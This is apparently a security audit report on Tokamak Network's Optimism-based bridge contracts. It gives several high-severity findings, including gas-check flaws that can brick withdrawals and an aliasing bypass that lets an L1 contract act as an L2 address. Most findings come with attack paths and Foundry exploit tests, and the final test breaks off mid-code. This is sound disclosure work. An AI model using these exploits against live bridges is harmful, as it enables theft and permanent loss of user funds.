# Issue H-1: L2 -> L1 messages might get stuck due to incorrect gas check in ````L1CrossDomainMessenger.relayMessage()```` 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/26 

## Found by 
0x416, 0xastronatey, GGONE, KingNFT, TessKimy
### Summary
As the design of Optimism bridge, the ````L1CrossDomainMessenger.relayMessage()```` must not revert once it was called by ````OptimismPortal````. Otherwise, messages will get stuck and can't be replayed. It achieves this goal by sound gas checks throughout the protocol. The issue is that the modification of ````L1CrossDomainMessenger.relayMessage()```` obviously increases the gas cost but doesn't tune the gas check logic accordingly, which might cause ````Out Of Gas```` revert in ````L1CrossDomainMessenger.relayMessage()````.

### Root Cause
(1) Optimism's original implementation of ````relayMessage()````, which is used by both ````L1CrossDomainMessenger```` and ````L2CrossDomainMessenger````.
```solidity
File: 2024-08-tokamak-network\tokamak-thanos\packages\contracts-bedrock\src\universal\CrossDomainMessenger.sol
211:     function relayMessage(
...
218:     )
...
221:     {
...
267:         if (
268:             !SafeCall.hasMinGas(_minGasLimit, RELAY_RESERVED_GAS + RELAY_GAS_CHECK_BUFFER) // @audit 40000 + 5000
269:                 || xDomainMsgSender != Constants.DEFAULT_L2_SENDER
270:         ) {
271:             failedMessages[versionedHash] = true;
272:             emit FailedRelayedMessage(versionedHash);
...
279:             if (tx.origin == Constants.ESTIMATION_ADDRESS) {
280:                 revert("CrossDomainMessenger: failed to relay message");
281:             }
282: 
283:             return;
284:         }
285: 
286:         xDomainMsgSender = _sender;
287:         bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, _value, _message);
288:         xDomainMsgSender = Constants.DEFAULT_L2_SENDER;
289: 
290:         if (success) {
...
293:             assert(successfulMessages[versionedHash] == false);
294:             successfulMessages[versionedHash] = true;
295:             emit RelayedMessage(versionedHash);
296:         } else {
297:             failedMessages[versionedHash] = true;
298:             emit FailedRelayedMessage(versionedHash);
...
305:             if (tx.origin == Constants.ESTIMATION_ADDRESS) {
306:                 revert("CrossDomainMessenger: failed to relay message");
307:             }
308:         }
309:     }

```
(2) Tokamak's modified version of ````L1CrossDomainMessenger.relayMessage()````, we can see two external ````approve()```` calls are added on [L299-302](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/6d4cf9ea730d5b52b622f0b3afd41a35d3eba8a2/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L299-L302) and [L305-307](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/6d4cf9ea730d5b52b622f0b3afd41a35d3eba8a2/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L305-L307). As the following PoC section shows it introduces about ````30K~40K```` additional gas cost, but the check logic of [L281](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/6d4cf9ea730d5b52b622f0b3afd41a35d3eba8a2/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L281) doesn't tune with this modification, and now it can't ensure the execution of ````relayMessage()```` will never revert.
```diff
File: 2024-08-tokamak-network\tokamak-thanos\packages\tokamak\contracts-bedrock\src\L1\L1CrossDomainMessenger.sol
222:     function relayMessage(
...
229:     )
...
233:     {
...
280:         if (
281:             !SafeCall.hasMinGas(_minGasLimit, RELAY_RESERVED_GAS + RELAY_GAS_CHECK_BUFFER) // @audit also 40000 + 5000
282:                 || xDomainMsgSender != Constants.DEFAULT_L2_SENDER
283:         ) {
284:             failedMessages[versionedHash] = true;
285:             emit FailedRelayedMessage(versionedHash);
286: 
...
292:             if (tx.origin == Constants.ESTIMATION_ADDRESS) {
293:                 revert("CrossDomainMessenger: failed to relay message");
294:             }
295:             return;
296:         }
297: 
298:         xDomainMsgSender = _sender;
+299:         // _target must not be address(0). otherwise, this transaction could be reverted
+300:         if (_value != 0 && _target != address(0)) {
+301:             IERC20(_nativeTokenAddress).approve(_target, _value);
+302:         }
303:         // _target is expected to perform a transferFrom to collect token
304:         bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, 0, _message);
+305:         if (_value != 0 && _target != address(0)) {
+306:             IERC20(_nativeTokenAddress).approve(_target, 0);
+307:         }
308:         xDomainMsgSender = Constants.DEFAULT_L2_SENDER;
309: 
310:         if (success) {
...
313:             assert(successfulMessages[versionedHash] == false);
314:             successfulMessages[versionedHash] = true;
315:             emit RelayedMessage(versionedHash);
316:         } else {
317:             failedMessages[versionedHash] = true;
318:             emit FailedRelayedMessage(versionedHash);
...
325:             if (tx.origin == Constants.ESTIMATION_ADDRESS) {
326:                 revert("CrossDomainMessenger: failed to relay message");
327:             }
328:         }
329:     }

File: 2024-08-tokamak-network\tokamak-thanos\packages\tokamak\contracts-bedrock\src\universal\CrossDomainMessenger.sol
111:     uint64 public constant RELAY_RESERVED_GAS = 40_000;
115:     uint64 public constant RELAY_GAS_CHECK_BUFFER = 5_000;

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

messages will get stuck and can't be replayed

### PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address, uint256) external;
}

contract ApproveGasTest is Test {
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant SPENDER = address(0x1234);

    function setUp()  public {
        vm.createSelectFork("https://mainnet.gateway.tenderly.co", 20807466); // Sep-22-2024 04:58:59 PM +UTC
    }

    function testUSDT() public {
        uint256 cost = _gasCostOfDoubleApprove(USDT);
        assertEq(cost, 32988);
    }

    function testUSDC() public {
        uint256 cost = _gasCostOfDoubleApprove(USDC);
        assertEq(cost, 40699);
    }

    function testDAI() public {
        uint256 cost = _gasCostOfDoubleApprove(DAI);
        assertEq(cost, 30303);
    }

    function testWETH() public {
        uint256 cost = _gasCostOfDoubleApprove(WETH);
        assertEq(cost, 30115);
    }

    function _gasCostOfDoubleApprove(IERC20 token) internal returns(uint256 cost) {
        uint256 gasBefore = gasleft();
        token.approve(SPENDER, 1000);
        token.approve(SPENDER, 0);
        uint256 gasAfter = gasleft();
        return gasBefore - gasAfter;
    }

}
```

### Mitigation

```diff
diff --git a/tokamak-thanos/packages/tokamak/contracts-bedrock/src/universal/CrossDomainMessenger.sol b/tokamak-thanos/packages/tokamak/contracts-bedrock/src/universal/CrossDomainMessenger.sol
index e1ce848..f223200 100644
--- a/tokamak-thanos/packages/tokamak/contracts-bedrock/src/universal/CrossDomainMessenger.sol
+++ b/tokamak-thanos/packages/tokamak/contracts-bedrock/src/universal/CrossDomainMessenger.sol
@@ -108,7 +108,7 @@ abstract contract CrossDomainMessenger is
     uint64 public constant RELAY_CALL_OVERHEAD = 40_000;
 
     /// @notice Gas reserved for finalizing the execution of `relayMessage` after the safe call.
-    uint64 public constant RELAY_RESERVED_GAS = 40_000;
+    uint64 public constant RELAY_RESERVED_GAS = 80_000;
 
     /// @notice Gas reserved for the execution between the `hasMinGas` check and the external
     ///         call in `relayMessage`.
```



## Discussion

**nguyenzung**

Regrading the spec of the L2 native token feature, L2 native token is a standard ERC20. If there is a hook on L2 native token functions, it will make the gas estimation becomes impossible. 

There is a PR about gas testing. The test shows that there is no issue about gas
https://github.com/tokamak-network/tokamak-thanos/pull/278

According the test, we can have an issue about incorrect value for RELAY_GAS_CHECK_BUFFER . The value needs to be increased to 35_000 ~ 40_000 from 5000. However, because OptimismPortal provides huge amount of gas when calling relayMessage, the functionality is still consistent this case even if we keep the current value for RELAY_GAS_CHECK_BUFFER.

So i believe that this issues and other related issues are not valid issues or low severity issues

# Issue H-2: L1 contract can evade aliasing, spoofing unowned L2 address 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/39 

## Found by 
0x416, 0xlrivo, KingNFT, haxagon, obront
### Summary

A key property of the Optimism bridge is that all contract addresses are aliased. This is to avoid a contract on L1 to be able to send messages as the same address on L2, because often these contracts will have different owners. However, using the `onApprove()` function, this aliasing can be evaded, giving L1 contracts this power.

### Root Cause

When `depositTransaction()` is called on the Optimism Portal, we use [the following check](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/OptimismPortal2.sol#L548-L549) to determine whether to alias the `from` address:
```solidity
address from =
    ((_sender != tx.origin) && !_isOnApproveTrigger) ? AddressAliasHelper.applyL1ToL2Alias(_sender) : _sender;
```
As we can see, this check does not alias the address is `_isOnApproveTrigger = true`.

This flag is set whenever the deposit is triggered via a call to `onApprove()`. However, it is entirely possible for a contract to use this flow, and therefore avoid being aliased.

### Internal Preconditions

None

### External Preconditions

None

### Attack Path

1. A contract on L1 is owned by a different user than the contract address on L2. This is typical, for example, with multisigs or safes that deployed using CREATE.
2. It wants to send a message on behalf of the L2 contract. For example, it may want to call `transfer()` on an ERC20 to steal their tokens.
3. It calls `approveAndCall()` on the Native Token on L1, including the message it wants to send on L2.
4. This message is passed along to the Optimism Portal's `onApprove()` function, which sets the `_isOnApproveTrigger` flag to true, and doesn't alias the address.
5. The result is that the L2 message comes `from` the unaliased L1 address, and arbitrary messages (including token transfers) can be performed on L2.

### Impact

L1 contracts can send arbitrary messages from their own address on L2, allowing them to steal funds from the owners of the L2 contracts.

### PoC

The following standalone test can be used to demonstrate this vulnerability:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { stdStorage, StdStorage, Test, console } from "forge-std/Test.sol";
import { OptimismPortal2 } from "../src/L1/OptimismPortal2.sol";
import { Constants } from "../src/libraries/Constants.sol";
import { L2NativeToken } from "../src/L1/L2NativeToken.sol";
import { ResourceMetering } from "../src/L1/ResourceMetering.sol";

contract MaliciousSafe {}

contract DummySystemConfig {
    address public nativeTokenAddress;

    constructor(address nativeToken) {
        nativeTokenAddress = nativeToken;
    }

    function resourceConfig() external view returns (ResourceMetering.ResourceConfig memory) {
        return Constants.DEFAULT_RESOURCE_CONFIG();
    }
}

contract POC is Test {
    using stdStorage for StdStorage;

    OptimismPortal2 portal;
    L2NativeToken token;

    event TransactionDeposited(address indexed from, address indexed to, uint256 indexed version, bytes opaqueData);

    function setUp() public {
        token = new L2NativeToken();
        DummySystemConfig config = new DummySystemConfig(address(token));

        portal = new OptimismPortal2(0, 0);
        stdstore.target(address(portal)).sig("systemConfig()").checked_write(address(config));

    }

    function testZach_noAlias() public {
        // we are sending from a safe, which isn't owned on L2
        address from = address(new MaliciousSafe());
        vm.startPrank(from);
        token.faucet(1);

        // let's make some transaction data
        // for example, transfer our addresses USDC on L2 to another address
        address to = makeAddr("L2USDC");
        uint value = 0;
        uint32 gasLimit = 1_000_000;
        bytes memory message = abi.encodeWithSignature("transfer(address,uint256)", address(1), 100e18);
        bytes memory onApproveData = abi.encodePacked(to, value, gasLimit, message);

        // confirm that the deposit transaction is:
        // from: from (non aliased)
        // to: L2USDC
        vm.expectEmit(true, true, false, false);
        emit TransactionDeposited(from, to, 0, bytes(""));

        // now we use approve and call to send the deposit transaction
        token.approveAndCall(address(portal), 1, onApproveData);
    }
}
```

### Mitigation

The `_sender != tx.origin` check is correct, even in the case that the call came via `onApprove()`, so the additional logic can be removed.


# Issue H-3: Withdrawals can be bricked due to gas calculation underflow 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/41 

## Found by 
obront
### Summary

The gas calculations on withdrawals through the Cross Domain Messenger are such that, no matter what `minGasLimit` a user sets, the withdrawal should be replayable and not lost.

However, because the diff to the L1 Cross Domain Messenger includes a new external call to `nativeToken.approve()` between the `hasMinGas` check and the actual call, the opportunity exists for an underflow that would brick the withdrawal and lose user funds.

### Root Cause

If withdrawals are processed through the Portal to the L1 Cross Domain Messenger and aren't stored in the `failedMessages` mapping, they are not replayable. This has been a major issue in Optimism audits in the past.

Optimism has fixed this issue by using [`SafeCall.hasMinGas()`](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/libraries/SafeCall.sol#L74-L81) to determine whether there is sufficient gas prior to the call from the Cross Domain Messenger. If not, we store the message in the `failedMessages` mapping and return early.

Specifically, what is being checked in `hasMinGas` is:
- Take the `_minGasLimit` provided by the user
- Multiple by 64/63 to account for the maximum amount of gas that can be forwarded on a call
- Add 40,000 plus the reserved gas passed to the result

The reserved gas passed to the function has been calculated by the Optimism team to reflect the contract's needs. Specifically, [it says](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/libraries/SafeCall.sol#L67-L69):

>  This function should *directly* precede the external call if possible. There is an added buffer to account for gas consumed between this check and the call, but it is only 5,700 gas.

Unfortunately, this contract has been changed to [add an external call to `nativeToken.approve()`](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L300-L302) between the check and the execution.

This could lead to a number of negative consequences, but the most serious is that, in the event that a low `minGasLimit` is used, the amount of gas left could be reduced to a value less than 40,000. Then, the external call is performed as follows (where `RELAY_RESERVED_GAS = 40_000`):
```solidity
bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, 0, _message);
```
This subtraction would underflow and cause a revert, which would lead to the withdrawal transaction being bricked and not replayable, losing user funds.

### Internal Preconditions

None

### External Preconditions

1. The `approve()` function of the Native Token uses at least 40_000 gas (just two SSTOREs).

### Attack Path

1. A withdrawal is made with a low `minGasLimit` through the Cross Domain Messenger (which shouldn't matter, because it should always be replayable).
2. An attacker watches for the withdrawal to be ready to be finalized.
3. They call `finalizeWithdrawalTransaction()` with a precise amount of gas that leads to the `hasMinGas` check to pass, but there to be less than 40,000 gas left by the time we get to the external call.
4. The function reverts from the underflow, and the transaction is lost.

### Impact

In the event that an L2 Native Token uses at least 40,000 gas in its `approve()` function, withdrawals with small `minGasLimit` values can be bricked and user funds lost, even if they use the safe flow of using the Cross Domain Messenger.

### PoC

The following test file implements a dummy `relayMessage()` function the simulates the exact gas usage of the main contract (without needing to simulate a full withdrawal).

The result is that there is sufficient gas to pass the `hasMinGas` check, but there is an underflow when calculating the gas left for the external call.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { stdStorage, StdStorage, Test, console } from "forge-std/Test.sol";
import { OptimismPortal2 } from "../src/L1/OptimismPortal2.sol";
import { Constants } from "../src/libraries/Constants.sol";
import { L2NativeToken } from "../src/L1/L2NativeToken.sol";
import { ResourceMetering } from "../src/L1/ResourceMetering.sol";

import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeCall } from "../src/libraries/SafeCall.sol";

contract DummyToken {
    mapping (address => mapping (address => uint256)) public approvals;
    mapping (address => address[]) public operators;

    function approve(address operator, uint256 amount) external returns (bool) {
        if (approvals[msg.sender][operator] == 0) {
            operators[msg.sender].push(operator);
        }

        approvals[msg.sender][operator] = amount;

        return true;
    }
}

contract DummyCrossDomainMessenger  {
    using SafeERC20 for IERC20;

    mapping (bytes32 => bool) public failedMessages;
    mapping (bytes32 => bool) public successfulMessages;
    address public xDomainMsgSender;
    address public nativeTokenAddress;

    uint64 public constant RELAY_CALL_OVERHEAD = 40_000;
    uint64 public constant RELAY_RESERVED_GAS = 40_000;
    uint64 public constant RELAY_GAS_CHECK_BUFFER = 5_000;

    event RelayedMessage(bytes32 indexed msgHash);
    event FailedRelayedMessage(bytes32 indexed msgHash);

    constructor(address _native) {
        nativeTokenAddress = _native;
        xDomainMsgSender = Constants.DEFAULT_L2_SENDER;
    }

    function relayMessage(address _sender, address _target, uint256 _value, uint32 _minGasLimit, bytes memory _message) external payable {
        // Load into memory to emulate contract conditions.
        address _nativeTokenAddress = nativeTokenAddress;
        bytes32 versionedHash = keccak256("doesntmatter");

        // If there is not enough gas left to perform the external call and finish the execution,
        // return early and assign the message to the failedMessages mapping.
        // We are asserting that we have enough gas to:
        // 1. Call the target contract (_minGasLimit + RELAY_CALL_OVERHEAD + RELAY_GAS_CHECK_BUFFER)
        //   1.a. The RELAY_CALL_OVERHEAD is included in `hasMinGas`.
        // 2. Finish the execution after the external call (RELAY_RESERVED_GAS).
        //
        // If `xDomainMsgSender` is not the default L2 sender, this function
        // is being re-entered. This marks the message as failed to allow it to be replayed.
        if (
            !SafeCall.hasMinGas(_minGasLimit, RELAY_RESERVED_GAS + RELAY_GAS_CHECK_BUFFER)
                || xDomainMsgSender != Constants.DEFAULT_L2_SENDER
        ) {
            failedMessages[versionedHash] = true;
            emit FailedRelayedMessage(versionedHash);

            // Revert in this case if the transaction was triggered by the estimation address. This
            // should only be possible during gas estimation or we have bigger problems. Reverting
            // here will make the behavior of gas estimation change such that the gas limit
            // computed will be the amount required to relay the message, even if that amount is
            // greater than the minimum gas limit specified by the user.
            if (tx.origin == Constants.ESTIMATION_ADDRESS) {
                revert("CrossDomainMessenger: failed to relay message");
            }
            return;
        }

        xDomainMsgSender = _sender;

        if (_value != 0 && _target != address(0)) {
            IERC20(_nativeTokenAddress).approve(_target, _value);
        }

        bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, 0, _message);

        if (_value != 0 && _target != address(0)) {
            IERC20(_nativeTokenAddress).approve(_target, 0);
        }

        xDomainMsgSender = Constants.DEFAULT_L2_SENDER;

        if (success) {
            assert(successfulMessages[versionedHash] == false);
            successfulMessages[versionedHash] = true;
            emit RelayedMessage(versionedHash);
        } else {
            failedMessages[versionedHash] = true;
            emit FailedRelayedMessage(versionedHash);
        }
    }
}

contract POC is Test {
    using stdStorage for StdStorage;

    DummyCrossDomainMessenger xdm;
    L2NativeToken token;

    function setUp() public {
        token = L2NativeToken(address(new DummyToken()));
        xdm = new DummyCrossDomainMessenger(address(token));
    }

    function testZach_minGasBreached() public {
        vm.expectRevert();
        xdm.relayMessage{gas: 88_500}(address(this), address(100), 1e18, 0, bytes(""));
    }
}
```

### Mitigation

The call to `approve()` should happen before the `hasMinGas` check to ensure that there are no variable amounts of gas reliant on external contracts that could cause issues with our mission critical calculations.


# Issue H-4: All native token withdrawals to EOA will fail 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/43 

## Found by 
0xastronatey, justAWanderKid, obront
### Summary

When a user withdraws the native token through the Cross Domain Messenger, the L1 result is that the token is approved, a callback is sent to the target address, and then the approval is removed. Since EOAs cannot act on a callback, the result is that all withdrawals of a native token to an EOA target will fail.

### Root Cause

When native token is withdrawn through the Cross Domain Messenger, we send the tokens by (a) approving the token to the target address, (b) calling the target address with arbitrary calldata, and (c) revoking the approval. [Here is the implementation:](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L300-L307)

```solidity
if (_value != 0 && _target != address(0)) {
    IERC20(_nativeTokenAddress).approve(_target, _value);
}
bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, 0, _message);
if (_value != 0 && _target != address(0)) {
    IERC20(_nativeTokenAddress).approve(_target, 0);
}
```
This pattern requires that the receiver is a contract with the ability to call `safeTransfer()` on the native token during that callback. This is of course not possible for EOAs, for whom the above call will be a no-op.

As issue similar to this seems to be mentioned in the Known Issues:

> "Especially, in case of _tx.data.length is not 0 and _tx.data includes function relayMessage(uint256 _nonce, address _sender, address _target, uint256 _value, uint256 _minGasLimit, bytes calldata _message), user may lose funds even if _sender is EOA"

But that issue focuses on the `_sender` being an EOA.

This issue highlights the 100% losses that will occur in the event that the `_target` is an EOA.


### Internal Preconditions

None

### External Preconditions

None

### Attack Path

1. Any funds are sent to the L2 Cross Domain Messenger with `_to` as an L1 EOA address.

### Impact

Anyone withdrawing a native token to an EOA wallet will lose their funds.

### PoC

N/A

### Mitigation

There are numerous possible solutions here. Some top contenders I'd recommend considering:
1) If the address is an EOA (or if some flag is set in the withdrawal), send the funds instead of approving them.
2) Keep the approvals set after the `relayMessage()` call, so the EOA can transfer them later (this would require using something like `increaseAllowance()` instead of `approve()`).


# Issue H-5: `seigManager` on `L2NativeToken` can cause withdrawals to revert, losing funds 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/45 

## Found by 
obront
### Summary

The `minGasLimit` set on L2 for an L1 withdrawal is a crucial value. Finalization of withdrawals is permissionless, so any attacker can choose the amount of gas that is sent with the transaction. In many cases, if the transaction reverts, we lose replayability and the withdrawer loses their funds.

On the `L2NativeToken` implementation that is planned to be used, there is a `seigManager` address that receives callbacks on all transfers. Any reverts that can be caused by the `seigManager` (most likely, gas usage causing out of gas failures) will cause the withdrawal to be lost.

### Root Cause

When native tokens are sent through the bridge, each layer of the bridge calls `approve()` on the native token, and the next layer is responsible for calling `transferFrom()` to pull the tokens along.

Most importantly, we can think about the Portal calling `approve()` while the L1 Cross Domain Messenger [calls](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L257-L259):
```solidity
if (_value > 0) {
    IERC20(_nativeTokenAddress).safeTransferFrom(address(portal), address(this), _value);
}
```
It is important to understand that all calls to the CrossDomainMessenger from the Portal must either succeed or set the `failedMessages` mapping. If a call reverts without setting `failedMessages`, the withdrawal will be lost, because calls from the Portal can only be played once.

In order to make this guarantee, some different gas limits are maintained:
1) The `minGasLimit` set by the user is used for the call from the Cross Domain Messenger, and there are checks to ensure that this much gas will be available.
2) A padded version with additional gas added is validated to be used from the Portal, to ensure that a malicious actor cannot call `finalizeWithdrawalTransaction()` with insufficnet gas that the call reverts.

However, these values to do not take into account the additional gas usage from the `safeTransferFrom()` call above. Specifically, this call happens outside of the gas checks that verify the above logic, and therefore will not save the message in `failedMessages` if it reverts.

This means that anything that pushes the `safeTransferFrom()` gas usage high enough that it could revert before getting to the `failedMessages` mapping update would cause the withdrawal to be bricked and lost.

There are many reasons this could happen with an arbitrary token, but with the current `L2NativeToken` implementation, we can see the `seigManager` address. When callbacks are enabled, the `seigManager` is called every single transfer due to [this overridden `_transfer()` function](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L2NativeToken.sol#L1064-L1069):
```solidity
function _transfer(address sender, address recipient, uint256 amount) internal override {
    super._transfer(sender, recipient, amount);
    if (callbackEnabled && address(seigManager) != address(0)) {
        require(seigManager.onTransfer(sender, recipient, amount));
    }
}
```
As a result, any `seigManager` that uses sufficient gas in that callback can be abused by an attacker to process the withdrawal transaction with too little gas, causing an early revert and loss of funds.

(Note that the same risk exists in the calls on the L1StandardBridge, which performs two transfers, but by the time the call has reached the bridge it should always be replayable, so it is a less significant issue.)

### Internal Preconditions

1. `seigManager` is set, and the callback uses sufficient gas that it is possible to run out of gas before the `failedMessages` mapping is set.

### External Preconditions

None.

### Attack Path

1. `seigManager` is set to a value that uses sufficient gas for us to run out of gas before the `failedMessages` mapping is set.
2. An attacker sees a withdrawal transaction with a low `minGasLimit`.
3. The attacker calls `finalizeWithdrawalTransaction()` with just the amount of gas to pass the OptimismPortal2 checks, which ensure that there would be enough gas to pass the `minGasLimit` to the call from the Cross Domain Messenger if none of the extra functionality was added.
4. Instead, the call out to `nativeToken.safeTransferFrom()` uses up enough of the gas that the `failedMessages` mapping is not set before the function reverts.
5. The withdrawal is lost and cannot be replayed.

### Impact

If the `seigManager` is set in such a way that it uses most of the gas that was allotted to the `minGasLimit` for the call (or the `safeTransferFrom()` call can be made to revert for some other reason), attackers can brick innocent user's withdrawals.

### PoC

N/A

### Mitigation

Use a low level call for the call to `transferFrom()` and set the `failedMessages` mapping before reverting in the event of a failure. This will ensure that the withdrawal can always be replayed in the event of a failure.

Additionally, it would be useful to adjust the constants around gas usage to reflect the realities of the upgraded contracts.


# Issue H-6: `RELAY_RESERVED_GAS` may be insufficient for post-call processing on Cross Domain Messenger 

Source: https://github.com/sherlock-audit/2024-08-tokamak-network-judging/issues/47 

## Found by 
obront
# `RELAY_RESERVED_GAS` may be insufficient for post-call processing on Cross Domain Messenger

### Severity

High

### Summary

The `RELAY_RESERVED_GAS` value in the Cross Domain Messenger has not been adjusted to account for the additional `nativeToken.approve()` call that was added between the call and the end of the function. As a result, it is possible for the reserved gas to be insufficient, causing withdrawals to fail without replayability and lose user funds.

### Root Cause

When a withdrawal message is processed through the Portal to the Cross Domain Messenger, it is absolutely critical that it does not revert without setting the `failedMessages` mapping. Otherwise, the safety and replayability guarantees of the Cross Domain Messenger will be broken.

Optimism achieves this by ensuring that at `RELAY_RESERVED_GAS` is reserved after the call, by sending the message with [the following logic](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L304):

```solidity
bool success = SafeCall.call(_target, gasleft() - RELAY_RESERVED_GAS, 0, _message);
```
(Note that this check doesn't exactly guarantee that `RELAY_RESERVED_GAS` is left, because of the 63/64th rule, but given additional previous checks, it is intended to provide this guarantee.)

Specifically, `RELAY_RESERVED_GAS` is set to `40_000`, which must be enough to perform [the remaining logic in the function after the call finishes execution](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/main/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/L1CrossDomainMessenger.sol#L305-L318):
```solidity
if (_value != 0 && _target != address(0)) {
    IERC20(_nativeTokenAddress).approve(_target, 0);
}
xDomainMsgSender = Constants.DEFAULT_L2_SENDER;

if (success) {
    // This check is identical to the one above, but it ensures that the same message cannot be relayed
    // twice, and adds a layer of protection against reentrancy.
    assert(successfulMessages[versionedHash] == false);
    successfulMessages[versionedHash] = true;
    emit RelayedMessage(versionedHash);
} else {
    failedMessages[versionedHash] = true;
    emit FailedRelayedMessage(versionedHash);

    // Revert in this case if the transaction was triggered by the estimation address. This
    // should only be possible during gas estimation or we have bigger problems. Reverting
    // here will make the behavior of gas estimation change such that the gas limit
    // computed will be the amount required to relay the message, even if that amount is
    // greater than the minimum gas limit specified by the user.
    if (tx.origin == Constants.ESTIMATION_ADDRESS) {
        revert("CrossDomainMessenger: failed to relay message");
    }
}
```
In Optimism's case, there was no call to `nativeToken.approve()`, so the `40_000` value was set to cover the `xDomainMsgSender` value reset, the single `SSTORE` in one of the mappings, and some other odds and ends.

With Thanos' changes, we add a call to `nativeToken.approve()`. Given the approval is setting the value to `0`, in most cases, this will not use sufficient gas to cause an out of gas error. However, it is not uncommong for certain tokens to have additional hooks or actions in their functions, and even one additional `SSTORE` in its execution would cause the `40_000` gas to be insufficient.

In the event that such a token is used as the native token, an attacker could call `finalizeWithdrawalTransaction()` with an amount of gas that is sufficient for execution, but leaves only `40_000` gas remaining afterwards, and it would revert and permanently lose the withdrawers funds.

### Internal Preconditions

None

### External Preconditions

None

### Attack Path

1. The native token uses more than 6451 gas (a single SSTORE) when `nativeToken.approve(target, 0)` is called.
2. An attacker calls `finalizeWithdrawalTransaction()` and passes the minimum acceptable amount of gas.
3. All gas is used according to the expectations, and we are left with 40_000 (`RELAY_RESERVED_GAS`) gas for execution after the call.
4. The call to approve uses too much gas that the execution cannot complete, so the call reverts and the withdrawal is permanently bricked.

### Impact

If the native token uses a modest 6451 gas when `nativeToken.approve(to, 0)` is called, an attacker can permanently brick withdrawals, losing user funds.

### PoC

The following test demonstrates the issue. A modified Cross Domain Messenger is used to emulate execution with `40_000` gas left after an external call.

The call reverting from the test with an `OutOfGas` error shows that we will not be able to complete the logic with the `40_000` gas.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { stdStorage, StdStorage, Test, console } from "forge-std/Test.sol";
import { OptimismPortal2 } from "../src/L1/OptimismPortal2.sol";
import { Constants } from "../src/libraries/Constants.sol";
import { L2NativeToken } from "../src/L1/L2NativeToken.sol";
import { ResourceMetering } from "../src/L1/ResourceMetering.sol";

import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeCall } from "../src/libraries/SafeCall.sol";

contract DummyToken {
    mapping (address => mapping (address => uint256)) public approvals;
    mapping (address => address[]) public operators;

    function approve(address operator, uint256 amount) external returns (bool) {
        if (approvals[msg.sender][operator] == 0) {
            operators[msg.sender].push(operator);
        } else if (amount == 0) {
            for (uint i = 0; i < operators[msg.sender].length; i++) {
                if (operators[msg.sender][i] == operator) {
                    operators[msg.sender][i] = operators[msg.sender][operators[msg.sender].length - 1];
                    operators[msg.sender].pop();
                    break;
                }
            }
        }

        approvals[msg.sender][operator] = amount;

        return true;
    }
}

contract DummyCrossDomainMessenger  {
    using SafeERC20 for IERC20;

    mapping (bytes32 => bool) public failedMessages;
    mapping (bytes32 => bool) public successfulMessages;
    address public xDomainMsgSender;
    address public nativeTokenAddress;

    event RelayedMessage(bytes32 indexed msgHash);
    event FailedRelayedMessage(bytes32 indexed msgHash);
    bytes32 versionedHash = keccak256("hash");

    constructor(address _native) {
        nativeTokenAddress = _native;
        xDomainMsgSender = Constants.DEFAULT_L2_SENDER;
    }

    function relayMessage(address _target, uint256 _value, bool success) external payable {
        if (_value != 0 && _target != address(0)) {
            IERC20(nativeTokenAddress).approve(_target, 0);
        }

        xDomainMsgSender = Constants.DEFAULT_L2_SENDER;

        if (success) {
            assert(successfulMessages[versionedHash] == false);
            successfulMessages[versionedHash] = true;
